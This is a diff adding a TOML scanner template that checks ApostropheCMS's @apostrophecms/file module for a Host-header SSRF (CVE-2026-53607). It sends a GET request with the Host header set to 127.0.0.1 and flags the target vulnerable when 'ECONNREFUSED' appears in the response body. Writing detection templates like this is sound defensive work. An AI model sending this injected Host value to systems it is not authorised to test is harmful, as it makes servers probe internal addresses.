@@ -1,0 +1,35 @@
+[info]
+author = "AVE"
+description = "检测ApostropheCMS @apostrophecms/file模块pretty-URL处理中的Host头注入SSRF漏洞。通过向目标发送带有指向内部地址的Host头的请求，判断服务器是否根据Host头发起内部请求。"
+id = "POC-AVE-2026-0776"
+name = "ApostropheCMS @apostrophecms/file SSRF PoC"
+severity = "low"
+tags = [
+    "cve-2026-53607",
+    "ssrf",
+    "apostrophecms",
+]
+vuln_id = [
+    "CVE-2026-53607",
+    "AVE-2026-0776",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/uploads/attachments/test.jpg"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "127.0.0.1"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "ECONNREFUSED",
+    "connect ECONNREFUSED",
+]
